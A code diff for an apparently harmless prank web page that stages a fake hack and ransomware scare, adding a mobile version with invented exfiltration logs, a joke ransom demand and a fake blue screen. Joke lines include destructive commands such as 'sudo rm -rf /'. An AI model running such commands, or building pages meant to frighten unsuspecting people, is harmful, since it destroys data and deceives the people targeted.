-      "[BEHAVIOR] Psychological resistance detected.",
-      "[BEHAVIOR] Resistance level: EMBARRASSING",
-      "",
-      "[OK]  MEME STAGING DATABASE ARMED",
-      "",
-      "Preparing payload..."
-    ];
+    
+    if (this.isMobile) {{
+      this.bootLines = [
+        "INITIALIZING MOBILE TELEMETRY...",
+        "CONNECTING TO CELLULAR SUBSYSTEM...",
+        "",
+        "[OK]  MOBILE HARDWARE DETECTED",
+        "[OK]  TOUCH INTERFACE COMPROMISED",
+        "[OK]  VICTIM LOCATED",
+        "",
+        "============================================================",
+        `[+] DEVICE IDENTIFIED: "${{this.deviceLabel}}"`,
+        "[+] SECURITY PATCH: OUTDATED (EMBARRASSING)",
+        "[+] POWER / BATTERY: 14% [DRAINING RAPIDLY]",
+        "[+] STORAGE: 99.8% FULL (14,219 UNNECESSARY SCREENSHOTS)",
+        "============================================================",
+        "",
+        "[PRIVILEGE] Current user status: MOBILE GUEST",
+        "[PRIVILEGE] Escalating to: ROOT / KERNEL... OK",
+        "[PRIVILEGE] Escalating to: SUPREME OVERLORD OF THIS PHONE... GRANTED",
+        "",
+        "[CAMERA] Initializing front optical selfie sensor...",
+        "[CAMERA] Human face detected in front of screen.",
+        "[CAMERA] Expression: VISIBLY SWEATING & CONFUSED 💀",
+        "[CAMERA] Status: NOT ACTUALLY ACCESSING CAMERA. CHILL.",
+        "",
+        "Scanning mobile storage for exfiltration...",
+        "  |████████████████████| 100%",
+        "",
+        "Targeting personal directories for exfiltration...",
+        "[EXFILTRATE] /DCIM/Camera/embarrassing_selfie_01.jpg ..... [UPLOADED]",
+        "[EXFILTRATE] /WhatsApp/chat_history_archive.db .......... [EXTRACTED]",
+        "[EXFILTRATE] /Notes/passwords_dont_open_serious.txt ..... [HELD HOSTAGE]",
+        "[EXFILTRATE] /Safari/Browsing_History_3AM.db ........... [LEAKED]",
+        "",
+        "============================================================",
+        "ALL YOUR MOBILE DATA HAS BEEN ENCRYPTED (AES-9000).",
+        "SEND 500 DOGECOIN TO PREVENT AUTO-SHARING TO YOUR CONTACTS.",
+        "...",
+        "JUST KIDDING. WE DON'T TOUCH YOUR FILES. 😭 BUT YOU LOOKED WORRIED.",
+        "============================================================",
+        "",
+        "[SECURITY] Mobile Security & Play Protect: DETECTED",
+        "[SECURITY] Deploying weaponized memes against mobile defense...",
+        "[SECURITY] Mobile Security: CONFUSED & CRYING",
+        "[SECURITY] Security status: SURRENDERED TO MEMES",
+        "",
+        "[OPERATOR] Remote mobile terminal connected.",
+        "[OPERATOR] > sudo rm -rf / ... wait how do i type on touchscreen",
+        "[OPERATOR] > sorry first day at the ransomware syndicate",
+        "[ERROR] Remote operator is typing with one thumb.",
+        "",
+        "[BEHAVIOR] Monitoring touchscreen pressure & heart rate...",
+        "[BEHAVIOR] Panic level: 37%",
+        "[BEHAVIOR] Panic level: 64%",
+        "[BEHAVIOR] Panic level: [███████████████] 97%",
+        "[BEHAVIOR] Resistance level: EMBARRASSING",
+        "",
+        "[OK]  MEME STAGING DATABASE ARMED",
+        "",
+        "Preparing mobile payload..."
+      ];
+    }} else {{
+      this.bootLines = [
+        "CONNECTING........",
+        "CONNECTING...............",
+        "",
+        "ACCESSING DISPLAY......",
+        "",
+        "[OK]  DISPLAY FOUND",
+        "[OK]  ADMINISTRATOR ACCESS GRANTED",
+        "[OK]  VICTIM LOCATED",
+        "",
+        "============================================================",
+        `[+] TARGET USER IDENTIFIED: "P_KAULANI"`,
+        `[+] WORKSTATION: "${{this.deviceLabel}}" (Windows 11 Pro 64-bit)`,
+        "[+] CPU ARCHITECTURE: AMD Ryzen 9 7950X (OVERHEATING - 94°C)",
+        "[+] INTERNAL NETWORK: 192.168.0.███ | MAC: 00:1A:2B:3C:██:██",
+        "[+] POWER / BATTERY: 4% [PLUG IN IMMEDIATELY OR DIE]",
+        "============================================================",
+        "",
+        "[PRIVILEGE] Current user status: GUEST / PEASANT",
+        "[PRIVILEGE] Escalating to: ADMINISTRATOR... OK",
+        "[PRIVILEGE] Escalating to: SYSTEM NT AUTHORITY... OK",
+        "[PRIVILEGE] Escalating to: SUPREME OVERLORD OF THIS LAPTOP... GRANTED",
+        "",
+        "[CAMERA] Initializing front optical sensor...",
+        "[CAMERA] Human face detected in front of screen.",
+        "[CAMERA] Expression: VISIBLY SWEATING & CONFUSED 💀",
+        "[CAMERA] Status: NOT ACTUALLY ACCESSING CAMERA. CHILL.",
+        "",
+        "Scanning system files...",
+        "  |████████████████████| 100%",
+        "",
+        "Targeting user directories for exfiltration...",
+        "[EXFILTRATE] C:\\Users\\Target\\Desktop\\Final_Project_v2_FINAL.docx .. [ENCRYPTED]",
+        "[EXFILTRATE] C:\\Users\\Target\\Documents\\passwords_dont_open.txt ... [HELD HOSTAGE]",
+        "[EXFILTRATE] C:\\Users\\Target\\Pictures\\childhood_photo.png ....... [UPLOADING]",
+        "[EXFILTRATE] C:\\Users\\Target\\AppData\\Browsing_History_3AM.db ... [EXTRACTED]",
+        "",
+        "============================================================",
+        "ALL YOUR FILES HAVE BEEN ENCRYPTED (AES-9000).",
+        "SEND 500 DOGECOIN TO WALLET: 0xDEAD...BEEF",
+        "...",
+        "JUST KIDDING. WE DON'T TOUCH YOUR FILES. 😭 BUT YOU LOOKED WORRIED.",
+        "============================================================",
+        "",
+        "[AV_BATTLE] Windows Defender: DETECTED",
+        "[AV_BATTLE] Deploying weaponized memes against antivirus...",
+        "[AV_BATTLE] Windows Defender: CONFUSED",
+        "[AV_BATTLE] System Firewall: EMOTIONALLY UNAVAILABLE",
+        "[AV_BATTLE] Third-party Antivirus: CRYING IN A CORNER",
+        "[AV_BATTLE] Security status: SURRENDERED",
+        "",
+        "[OPERATOR] Remote terminal session established.",
+        "[OPERATOR] > cd system32",
+        "[OPERATOR] > rm -rf /* ... wait wrong operating system",
+        "[OPERATOR] > what button do I click guys",
+        "[OPERATOR] > sorry first day at the ransomware syndicate",
+        "[ERROR] Remote operator appears to be an intern.",
+        "",
+        "[BEHAVIOR] Monitoring user input and keyboard pressure...",
+        "[BEHAVIOR] Panic level: 37%",
+        "[BEHAVIOR] Panic level: 64%",
+        "[BEHAVIOR] Panic level: [███████████████] 97%",
+        "[BEHAVIOR] Psychological resistance detected.",
+        "[BEHAVIOR] Resistance level: EMBARRASSING",
+        "",
+        "[OK]  MEME STAGING DATABASE ARMED",
+        "",
+        "Preparing payload..."
+      ];
+    }}
+
     this.bootIdx = 0;
     this.bootChar = 0;
     this.bootTimer = 0;
@@ -830,8 +723,10 @@ class WebChaosPrank {{
       requestAnimationFrame((t) => this.loop(t));
     }}
   }}
+
   initGrid() {{
-    const COLS = 5, ROWS = 4;
+    const COLS = this.isMobile ? 2 : 5;
+    const ROWS = this.isMobile ? 5 : 4;
     const cellW = this.W / COLS;
     const cellH = this.H / ROWS;
     this.gridSlots = [];
@@ -843,11 +738,10 @@ class WebChaosPrank {{
         }});
       }}
     }}
-    // Shuffle slots
     this.gridSlots.sort(() => Math.random() - 0.5);
     this.totalPrimary = this.gridSlots.length;
     this.spawnTimer = 0;
-    this.spawnIv = 1.35;
+    this.spawnIv = this.isMobile ? 0.9 : 1.35;
     this.overloadTimer = 0;
   }}
 
@@ -855,20 +749,20 @@ class WebChaosPrank {{
     const neonCols = ["#ff007f", "#00e5ff", "#39ff14", "#ffe600", "#ff6600", "#bf00ff"];
     const titles = ["MEME_PAYLOAD.EXE", "VIRUS_BRAINROT.VBS", "DOGE_OVERLOAD.SYS", "CHAOS_OVERFLOW.DLL", "LOL_INFECTION.BAT"];
     const errors = [
-      {{ t: "Critical System Alert", m: "CRITICAL ERROR 0x80004005:\\nToo many memes in memory buffer.", c: "#cc0000", i: "X" }},
-      {{ t: "Fatal Exception", m: "FATAL EXCEPTION at 0xDEADBEEF:\\nVictim did not bring a keyboard.", c: "#cc0000", i: "X" }},
-      {{ t: "Windows Defender Alert", m: "VIRUS WARNING: 'Brainrot.Gen'\\nContainment protocol failed completely.", c: "#e68a00", i: "!" }},
-      {{ t: "Memory Allocation Error", m: "OUT OF MEMORY:\\nMeme density exceeded 9000 terabytes.", c: "#e68a00", i: "!" }},
-      {{ t: "Application Hang", m: "Windows is laughing too hard.\\nChaosEngine.exe has crashed into memes.", c: "#0055aa", i: "i" }},
-      {{ t: "Security Breach", m: "ALERT: Administrator privileges granted\\nto 18 uncontrollable meme entities.", c: "#990099", i: "!" }},
-      {{ t: "System Failure", m: "ERROR 404: Common Sense Not Found.\\nPlease restart victim.", c: "#cc0000", i: "X" }}
+      {{ t: "Critical System Alert", m: "CRITICAL ERROR 0x80004005:\nToo many memes in memory buffer.", c: "#cc0000", i: "X" }},
+      {{ t: "Fatal Exception", m: "FATAL EXCEPTION at 0xDEADBEEF:\nVictim heartbeat elevated.", c: "#cc0000", i: "X" }},
+      {{ t: "Security Alert", m: "VIRUS WARNING: 'Brainrot.Gen'\nContainment protocol failed completely.", c: "#e68a00", i: "!" }},
+      {{ t: "Memory Allocation Error", m: "OUT OF MEMORY:\nMeme density exceeded 9000 terabytes.", c: "#e68a00", i: "!" }},
+      {{ t: "Application Hang", m: "System is laughing too hard.\nChaosEngine has crashed into memes.", c: "#0055aa", i: "i" }},
+      {{ t: "Security Breach", m: "ALERT: Administrator privileges granted\nto uncontrollable meme entities.", c: "#990099", i: "!" }},
+      {{ t: "System Failure", m: "ERROR 404: Common Sense Not Found.\nPlease restart victim.", c: "#cc0000", i: "X" }}
     ];
 
     let cx, cy;
     if (this.gridSlots && this.gridSlots.length > 0) {{
       const slot = this.gridSlots.pop();
-      cx = slot.cx + (Math.random() - 0.5) * 30;
-      cy = slot.cy + (Math.random() - 0.5) * 25;
+      cx = slot.cx + (Math.random() - 0.5) * (this.isMobile ? 18 : 30);
+      cy = slot.cy + (Math.random() - 0.5) * (this.isMobile ? 16 : 25);
       this.filledPrimary++;
     }} else {{
       cx = 0.12 * this.W + Math.random() * 0.76 * this.W;
@@ -876,6 +770,9 @@ class WebChaosPrank {{
     }}
 
     const isMeme = Math.random() < 0.65 && this.images.length > 0;
+    const baseW = this.isMobile ? Math.min(this.W * 0.84, 280) : (isMeme ? 320 : 340);
+    const baseH = this.isMobile ? Math.min(this.H * 0.25, 190) : (isMeme ? 240 : 145);
+
     const item = {{
       isMeme: isMeme,
       img: isMeme ? this.images[Math.floor(Math.random() * this.images.length)] : null,
@@ -884,8 +781,8 @@ class WebChaosPrank {{
       title: titles[Math.floor(Math.random() * titles.length)],
       cx: cx,
       cy: cy,
-      w: isMeme ? 320 : 340,
-      h: isMeme ? 240 : 145,
+      w: baseW,
+      h: baseH,
       scale: 0.01,
       phase: "grow",
       phaseT: 0,
@@ -899,8 +796,8 @@ class WebChaosPrank {{
         const dy = my - btnY;
         const dist = Math.hypot(dx, dy);
         if (dist < 65) {{
-          this.cx = 0.18 * W + Math.random() * 0.64 * W;
-          this.cy = 0.18 * H + Math.random() * 0.64 * H;
+          this.cx = 0.16 * W + Math.random() * 0.68 * W;
+          this.cy = 0.16 * H + Math.random() * 0.68 * H;
           this.dodgeCooldown = 0.4;
           sfx.dodge();
           return true;
@@ -918,6 +815,9 @@ class WebChaosPrank {{
     this.shakeUntil = performance.now() + 80;
     if (isMeme) this.sfx.pop();
     else this.sfx.glitch();
+    if (this.isMobile && navigator.vibrate) {{
+      try {{ navigator.vibrate(40); }} catch(e) {{}}
+    }}
   }}
 
   update(dt) {{
@@ -930,7 +830,8 @@ class WebChaosPrank {{
     // 1. BOOT SEQUENCE
     if (this.state === "BOOT") {{
       this.bootTimer += dt;
-      if (this.bootTimer >= 0.075) {{
+      const stepDelay = this.isMobile ? 0.045 : 0.065;
+      if (this.bootTimer >= stepDelay) {{
         this.bootTimer = 0;
         if (this.bootIdx < this.bootLines.length) {{
           const line = this.bootLines[this.bootIdx];
@@ -953,18 +854,19 @@ class WebChaosPrank {{
     else if (this.state === "DOWNLOADING") {{
       this.dlTimer += dt;
       if (this.dlIdx < MEME_ASSETS.length) {{
-        this.dlProg += dt * 1.5;
+        this.dlProg += dt * 1.8;
         if (this.dlProg >= 1.0) {{
           this.dlProg = 0;
           const m = MEME_ASSETS[this.dlIdx];
           const kb = Math.round(m.size / 1024);
-          this.revealedLines.push(`[DOWNLOAD] ${{m.name.padEnd(42, ' ')}} [████████████████████] 100% (${{kb}} KB)`);
+          const nameTrim = this.isMobile ? m.name.substring(0, 24) : m.name;
+          this.revealedLines.push(`[DOWNLOAD] ${{nameTrim.padEnd(this.isMobile ? 26 : 42, ' ')}} [████████████████████] 100% (${{kb}} KB)`);
           this.dlIdx++;
           this.sfx.blip();
         }}
       }} else {{
         this.revealedLines.push("");
-        this.revealedLines.push("[OK] ALL 18 MEME ASSETS DOWNLOADED AND LOADED");
+        this.revealedLines.push("[OK] ALL MEME ASSETS DOWNLOADED AND LOADED");
         this.revealedLines.push("");
         this.revealedLines.push("Attempting containment... FAILED");
         this.revealedLines.push("UNAUTHORIZED MEME ACTIVITY DETECTED");
@@ -972,19 +874,20 @@ class WebChaosPrank {{
         this.revealedLines.push("WE CHANGED OUR MIND.");
         this.revealedLines.push("Just kidding: 5.. 4.. 3.. 2.. 1.. LOL");
         this.sfx.warn();
+        if (navigator.vibrate) {{ try {{ navigator.vibrate([100, 50, 100]); }} catch(e){{}} }}
         this.state = "TILING_GAPS";
         this.initGrid();
       }}
     }}
 
-    // 3. TILING GAPS (Phase 4 - one by one filling every gap, relaxed pacing)
+    // 3. TILING GAPS
     else if (this.state === "TILING_GAPS") {{
       this.spawnTimer += dt;
       if (this.spawnTimer >= this.spawnIv) {{
         this.spawnTimer = 0;
         if (this.gridSlots.length > 0) {{
           this.spawnVirusItem();
-          this.spawnIv = Math.max(0.55, this.spawnIv * 0.96);
+          this.spawnIv = Math.max(this.isMobile ? 0.45 : 0.55, this.spawnIv * 0.95);
         }} else {{
           this.state = "CASCADE_SATURATION";
           this.cascadeTimer = 0;
@@ -999,15 +902,17 @@ class WebChaosPrank {{
       }});
     }}
 
-    // 4. CASCADE SATURATION (Phase 5 - rapid spam of memes & error messages)
+    // 4. CASCADE SATURATION
     else if (this.state === "CASCADE_SATURATION") {{
       this.spawnTimer += dt;
       this.cascadeTimer += dt;
-      if (this.cascadeTimer >= 1.5 && !this.toastActive) {{
+      if (this.cascadeTimer >= 1.2 && !this.toastActive) {{
         this.toastActive = true;
         this.sfx.winError();
+        if (navigator.vibrate) {{ try {{ navigator.vibrate(120); }} catch(e){{}} }}
       }}
-      if (this.spawnTimer >= 0.22) {{
+      const fastRate = this.isMobile ? 0.18 : 0.22;
+      if (this.spawnTimer >= fastRate) {{
         this.spawnTimer = 0;
         this.spawnVirusItem();
       }}
@@ -1017,14 +922,15 @@ class WebChaosPrank {{
           this.shakeUntil = performance.now() + 80;
         }}
       }});
-      if (this.cascadeTimer >= 10.0) {{
+      if (this.cascadeTimer >= 8.5) {{
         this.state = "GLITCH";
         this.glitchStart = performance.now();
         this.sfx.winError();
+        if (navigator.vibrate) {{ try {{ navigator.vibrate([150, 50, 150, 50, 200]); }} catch(e){{}} }}
       }}
     }}
 
-    // 5. GLITCH (Phase 6 - Screen Tearing & Stutter)
+    // 5. GLITCH
     else if (this.state === "GLITCH") {{
       const elapsed = (performance.now() - this.glitchStart) / 1000;
       if (elapsed >= 1.4) {{
@@ -1035,11 +941,11 @@ class WebChaosPrank {{
       }}
     }}
 
-    // 6. BSOD (Phase 7 - Windows Blue Screen of Death with Panic Freeze)
+    // 6. BSOD / KERNEL PANIC
     else if (this.state === "BSOD") {{
       const elapsed = (performance.now() - this.bsodStart) / 1000;
-      if (elapsed >= 7.0) {{
-        if (this.panicCount >= 1 || elapsed >= 13.0) {{
+      if (elapsed >= 6.5) {{
+        if (this.panicCount >= 1 || elapsed >= 12.0) {{
           this.state = "STARTUP_REPAIR";
           this.repairStart = performance.now();
           this.sfx.warn();
@@ -1047,7 +953,7 @@ class WebChaosPrank {{
       }}
     }}
 
-    // 7. STARTUP REPAIR (Phase 8 - Diagnostic Progress)
+    // 7. STARTUP REPAIR
     else if (this.state === "STARTUP_REPAIR") {{
       const elapsed = (performance.now() - this.repairStart) / 1000;
       if (elapsed >= 4.2) {{
@@ -1056,13 +962,13 @@ class WebChaosPrank {{
       }}
     }}
 
-    // 8. CLEANUP (Phase 9 - Terminal restore)
+    // 8. CLEANUP & Monologue
     else if (this.state === "CLEANUP") {{
       this.cleanupTimer += dt;
       if (!this.cleanupLines) {{
         this.cleanupLines = [
           "",
-          "Reinitializing terminal...",
+          "Reinitializing system terminal...",
           "Cleaning visual payload...          [OK]",
           "Deleting evidence...                ERROR.",
           "",
@@ -1084,11 +990,11 @@ class WebChaosPrank {{
           "============================================================",
           "               FINAL DIGNITY AUDIT               ",
           "============================================================",
-          "  SYSTEM STATUS:   NORMAL",
-          "  FILES:           100% UNTOUCHED & SAFE",
-          "  DATA PRIVACY:    ZERO REAL DATA COLLECTED",
-          "  USER INTEGRITY:  EMOTIONALLY COMPROMISED",
-          "  DIGNITY:         DID NOT SURVIVE 💀",
+          `  SYSTEM STATUS:   NORMAL`,
+          `  ${{this.isMobile ? 'MOBILE FILES:   ' : 'FILES:          '}} 100% UNTOUCHED & SAFE`,
+          `  DATA PRIVACY:    ZERO REAL DATA COLLECTED`,
+          `  USER INTEGRITY:  EMOTIONALLY COMPROMISED`,
+          `  DIGNITY:         DID NOT SURVIVE 💀`,
           "============================================================",
           "",
           "Unfortunately, your pride did not survive.",
@@ -1133,7 +1039,6 @@ class WebChaosPrank {{
     const y = s.cy - h / 2;
 
     this.ctx.save();
-    // Card background & neon border
     this.ctx.fillStyle = "#0a0e14";
     this.ctx.fillRect(x, y, w, h);
     this.ctx.strokeStyle = s.neonColor;
@@ -1144,7 +1049,7 @@ class WebChaosPrank {{
     this.ctx.fillStyle = s.neonColor;
     this.ctx.fillRect(x + 2, y + 2, w - 4, 24 * s.scale);
     this.ctx.fillStyle = "#040608";
-    this.ctx.font = `bold ${{Math.max(10, 12 * s.scale)}}px Consolas, monospace`;
+    this.ctx.font = `bold ${{Math.max(9, 11 * s.scale)}}px Consolas, monospace`;
     this.ctx.fillText(s.title, x + 8, y + 17 * s.scale);
 
     // Buttons [-] [口] [X]
@@ -1158,7 +1063,7 @@ class WebChaosPrank {{
     this.ctx.font = `bold ${{Math.max(8, 10 * s.scale)}}px sans-serif`;
     this.ctx.fillText("X", bx + 36 * s.scale, y + 15 * s.scale);
 
-    // Meme Image inside
+    // Meme Image
     if (s.img && s.img.width > 0) {{
       const bodyW = w - 12;
       const bodyH = h - 34 * s.scale;
@@ -1180,7 +1085,6 @@ class WebChaosPrank {{
     const d = s.errorData;
 
     this.ctx.save();
-    // Bevel Windows dialog box
     this.ctx.fillStyle = "#c0c0c0";
     this.ctx.fillRect(x, y, w, h);
     this.ctx.strokeStyle = "#ffffff";
@@ -1197,7 +1101,7 @@ class WebChaosPrank {{
     this.ctx.fillStyle = d.c;
     this.ctx.fillRect(x + 4, y + 4, w - 8, 22 * s.scale);
     this.ctx.fillStyle = "#ffffff";
-    this.ctx.font = `bold ${{Math.max(9, 12 * s.scale)}}px Tahoma, Consolas, sans-serif`;
+    this.ctx.font = `bold ${{Math.max(9, 11 * s.scale)}}px Tahoma, Consolas, sans-serif`;
     this.ctx.fillText(d.t, x + 8, y + 18 * s.scale);
 
     // Icon Circle
@@ -1205,54 +1109,52 @@ class WebChaosPrank {{
     const iy = y + 55 * s.scale;
     this.ctx.fillStyle = d.i === "X" ? "#cc0000" : (d.i === "!" ? "#e68a00" : "#0055aa");
     this.ctx.beginPath();
-    this.ctx.arc(ix, iy, 16 * s.scale, 0, Math.PI * 2);
+    this.ctx.arc(ix, iy, 15 * s.scale, 0, Math.PI * 2);
     this.ctx.fill();
     this.ctx.fillStyle = "#ffffff";
-    this.ctx.font = `bold ${{Math.max(10, 16 * s.scale)}}px sans-serif`;
+    this.ctx.font = `bold ${{Math.max(10, 15 * s.scale)}}px sans-serif`;
     this.ctx.textAlign = "center";
-    this.ctx.fillText(d.i, ix, iy + 6 * s.scale);
+    this.ctx.fillText(d.i, ix, iy + 5 * s.scale);
     this.ctx.textAlign = "left";
 
     // Text Lines
     this.ctx.fillStyle = "#000000";
-    this.ctx.font = `${{Math.max(9, 11 * s.scale)}}px Tahoma, Consolas, sans-serif`;
-    const lines = d.m.split("\\n");
+    this.ctx.font = `${{Math.max(8, 10 * s.scale)}}px Tahoma, Consolas, sans-serif`;
+    const lines = d.m.split("\n");
     lines.forEach((l, idx) => {{
-      this.ctx.fillText(l, x + 48 * s.scale, y + 48 * s.scale + idx * 16 * s.scale);
+      this.ctx.fillText(l, x + 44 * s.scale, y + 46 * s.scale + idx * 15 * s.scale);
     }});
 
-    // Button [ OK ] [ Panic / Cancel ]
-    const btnW = 60 * s.scale;
+    // Button [ OK ] [ Panic ]
+    const btnW = 56 * s.scale;
     const btnH = 22 * s.scale;
-    const by = y + h - 32 * s.scale;
+    const by = y + h - 30 * s.scale;
     this.ctx.fillStyle = "#d4d0c8";
-    this.ctx.fillRect(x + w / 2 - 68 * s.scale, by, btnW, btnH);
+    this.ctx.fillRect(x + w / 2 - 64 * s.scale, by, btnW, btnH);
     this.ctx.fillRect(x + w / 2 + 8 * s.scale, by, btnW, btnH);
     this.ctx.strokeStyle = "#404040";
-    this.ctx.strokeRect(x + w / 2 - 68 * s.scale, by, btnW, btnH);
+    this.ctx.strokeRect(x + w / 2 - 64 * s.scale, by, btnW, btnH);
     this.ctx.strokeRect(x + w / 2 + 8 * s.scale, by, btnW, btnH);
     this.ctx.fillStyle = "#000000";
-    this.ctx.font = `${{Math.max(9, 11 * s.scale)}}px Tahoma, sans-serif`;
-    this.ctx.fillText("OK", x + w / 2 - 46 * s.scale, by + 15 * s.scale);
-    this.ctx.fillText("Panic", x + w / 2 + 24 * s.scale, by + 15 * s.scale);
+    this.ctx.font = `${{Math.max(8, 10 * s.scale)}}px Tahoma, sans-serif`;
+    this.ctx.fillText("OK", x + w / 2 - 44 * s.scale, by + 15 * s.scale);
+    this.ctx.fillText("Panic", x + w / 2 + 22 * s.scale, by + 15 * s.scale);
 
     this.ctx.restore();
   }}
 
   drawSimulatedDesktop() {{
+    if (this.isMobile) {{
+      this.drawMobileHomeScreen();
+      return;
+    }}
+
+    // PC Desktop Wallpaper
     const grad = this.ctx.createLinearGradient(0, 0, this.W, this.H);
     grad.addColorStop(0, "#0b2038");
     grad.addColorStop(1, "#004785");
     this.ctx.fillStyle = grad;
     this.ctx.fillRect(0, 0, this.W, this.H);
-
-    // Subtle background logo glow
-    this.ctx.fillStyle = "rgba(255, 255, 255, 0.04)";
-    const cx = this.W * 0.55, cy = this.H * 0.45;
-    this.ctx.fillRect(cx - 100, cy - 80, 95, 75);
-    this.ctx.fillRect(cx + 5, cy - 80, 115, 75);
-    this.ctx.fillRect(cx - 100, cy + 5, 95, 85);
-    this.ctx.fillRect(cx + 5, cy + 5, 115, 85);
 
     // Desktop icons
     const icons = [
@@ -1290,14 +1192,6 @@ class WebChaosPrank {{
     this.ctx.fillRect(10, this.H - 20, 10, 10);
     this.ctx.fillRect(22, this.H - 20, 10, 10);
 
-    // Search Box
-    this.ctx.fillStyle = "#1f2228";
-    this.ctx.fillRect(45, this.H - 34, 180, 28);
-    this.ctx.fillStyle = "#888888";
-    this.ctx.font = "12px 'Segoe UI', Tahoma, sans-serif";
-    this.ctx.textAlign = "left";
-    this.ctx.fillText("Type here to search", 55, this.H - 16);
-
     // Live Clock
     const d = new Date();
     const timeStr = d.toLocaleTimeString([], {{ hour: '2-digit', minute: '2-digit' }});
@@ -1310,53 +1204,149 @@ class WebChaosPrank {{
     this.ctx.textAlign = "left";
   }}
 
+  drawMobileHomeScreen() {{
+    // Mobile Wallpaper
+    const grad = this.ctx.createLinearGradient(0, 0, 0, this.H);
+    grad.addColorStop(0, "#141e30");
+    grad.addColorStop(0.5, "#243b55");
+    grad.addColorStop(1, "#0f2027");
+    this.ctx.fillStyle = grad;
+    this.ctx.fillRect(0, 0, this.W, this.H);
+
+    // Top Status Bar
+    this.ctx.fillStyle = "rgba(0, 0, 0, 0.35)";
+    this.ctx.fillRect(0, 0, this.W, 36);
+
+    const d = new Date();
+    const timeStr = d.toLocaleTimeString([], {{ hour: '2-digit', minute: '2-digit' }});
+    this.ctx.fillStyle = "#ffffff";
+    this.ctx.font = "bold 13px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
+    this.ctx.textAlign = "left";
+    this.ctx.fillText(timeStr, 18, 23);
+
+    this.ctx.textAlign = "right";
+    this.ctx.font = "12px sans-serif";
+    this.ctx.fillText("5G  📶  🔋 14%", this.W - 16, 23);
+    this.ctx.textAlign = "left";
+
+    // Mobile App Icons (4 columns)
+    const apps = [
+      {{ name: "Camera", icon: "📷", bg: "#4a4a4a" }},
+      {{ name: "Photos", icon: "🖼️", bg: "#ffffff" }},
+      {{ name: "WhatsApp", icon: "💬", bg: "#25D366" }},
+      {{ name: "TikTok", icon: "🎵", bg: "#000000" }},
+      {{ name: "Settings", icon: "⚙️", bg: "#8e8e93" }},
+      {{ name: "Safari", icon: "🧭", bg: "#007aff" }},
+      {{ name: "Files", icon: "📁", bg: "#5ac8fa" }},
+      {{ name: "YouTube", icon: "▶️", bg: "#ff0000" }}
+    ];
+
+    const cols = 4;
+    const appSize = Math.min(52, (this.W - 56) / 4);
+    const startY = 60;
+    const colSpacing = (this.W - 28) / cols;
+
+    apps.forEach((app, idx) => {{
+      const c = idx % cols;
+      const r = Math.floor(idx / cols);
+      const ax = 14 + c * colSpacing + (colSpacing - appSize) / 2;
+      const ay = startY + r * (appSize + 30);
+
+      this.ctx.fillStyle = app.bg;
+      this.ctx.fillRect(ax, ay, appSize, appSize);
+
+      this.ctx.font = `${{Math.floor(appSize * 0.52)}}px sans-serif`;
+      this.ctx.textAlign = "center";
+      this.ctx.fillText(app.icon, ax + appSize / 2, ay + appSize * 0.68);
+
+      this.ctx.fillStyle = "#ffffff";
+      this.ctx.font = "10px -apple-system, BlinkMacSystemFont, sans-serif";
+      this.ctx.fillText(app.name, ax + appSize / 2, ay + appSize + 13);
+    }});
+
+    // Mobile Dock at Bottom
+    const dockH = 70;
+    const dockW = this.W - 24;
+    const dockX = 12;
+    const dockY = this.H - dockH - 20;
+
+    this.ctx.fillStyle = "rgba(255, 255, 255, 0.2)";
+    this.ctx.fillRect(dockX, dockY, dockW, dockH);
+
+    const dockApps = [
+      {{ icon: "📞", bg: "#34c759" }},
+      {{ icon: "✉️", bg: "#007aff" }},
+      {{ icon: "🌐", bg: "#5856d6" }},
+      {{ icon: "🎵", bg: "#ff2d55" }}
+    ];
+    const dockSpacing = dockW / 4;
+    dockApps.forEach((da, idx) => {{
+      const dax = dockX + idx * dockSpacing + (dockSpacing - 42) / 2;
+      const day = dockY + (dockH - 42) / 2;
+      this.ctx.fillStyle = da.bg;
+      this.ctx.fillRect(dax, day, 42, 42);
+      this.ctx.font = "20px sans-serif";
+      this.ctx.textAlign = "center";
+      this.ctx.fillText(da.icon, dax + 21, day + 28);
+    }});
+
+    // Home indicator
+    this.ctx.fillStyle = "rgba(255, 255, 255, 0.7)";
+    const barW = Math.min(130, this.W * 0.35);
+    this.ctx.fillRect((this.W - barW) / 2, this.H - 8, barW, 4);
+    this.ctx.textAlign = "left";
+  }}
+
   drawBSOD() {{
     this.ctx.fillStyle = "#0000AA";
     this.ctx.fillRect(0, 0, this.W, this.H);
 
     const bsodLines = [
-      "A problem has been detected and Windows has been shut down to prevent damage",
-      "to your computer.",
+      "A problem has been detected and the system has halted.",
       "",
       "MEME_OVERFLOW_EXCEPTION",
       "",
-      "If this is the first time you've seen this Stop error screen,",
-      "restart your computer. If this screen appears again, follow",
+      "If this is the first time you've seen this error screen,",
+      "restart your device. If this screen appears again, follow",
       "these steps:",
       "",
-      "Check to make sure any new meme hardware or software is properly configured.",
-      "Did you really run an unknown diagnostic script from a terminal?",
-      "",
-      "If problems continue, disable or remove any newly downloaded meme packages.",
-      "Disable BIOS memory options such as caching or shadowing.",
+      "Check to make sure any new meme hardware is properly configured.",
+      "Did you really open an unknown diagnostic link from a chat?",
       "",
       "Technical information:",
-      "",
-      "*** STOP: 0x00000042 (0xDEADBEEF, 0x00000420, 0x1337BABE, 0xFEEDC0DE)",
-      "",
-      "*** Address 0x80400000 base at 0x80400000, DateStamp 42424242 - vibes.sys",
+      "*** STOP: 0x00000042 (0xDEADBEEF, 0x1337BABE, 0xFEEDC0DE)",
+      "*** Base at 0x80400000, DateStamp 42424242 - vibes.sys",
       "",
       "Beginning dump of physical memory...",
       "Dumping physical memory to disk: 100%",
-      "Physical memory dump complete.",
-      "Contact your system administrator or technical support group for further assistance."
+      "Physical memory dump complete."
     ];
 
     this.ctx.fillStyle = "#FFFFFF";
     this.ctx.textAlign = "left";
-    let y = Math.max(30, (this.H - bsodLines.length * 22) / 2);
+    const fontSz = this.isMobile ? 11 : 14;
+    const leftPad = this.isMobile ? 18 : 80;
+    const lineH = this.isMobile ? 20 : 23;
+    let y = Math.max(30, (this.H - bsodLines.length * lineH) / 2);
 
     for (let i = 0; i < bsodLines.length; i++) {{
       const line = bsodLines[i];
       if (line === "MEME_OVERFLOW_EXCEPTION") {{
-        this.ctx.font = "bold 20px 'Courier New', monospace";
-        this.ctx.fillText(line, 80, y);
-        y += 32;
+        this.ctx.font = `bold ${{fontSz + 6}}px 'Courier New', monospace`;
+        this.ctx.fillText(line, leftPad, y);
+        y += lineH + 8;
       }} else {{
-        this.ctx.font = "14px 'Courier New', monospace";
-        this.ctx.fillText(line, 80, y);
-        y += 22;
+        this.ctx.font = `${{fontSz}}px 'Courier New', monospace`;
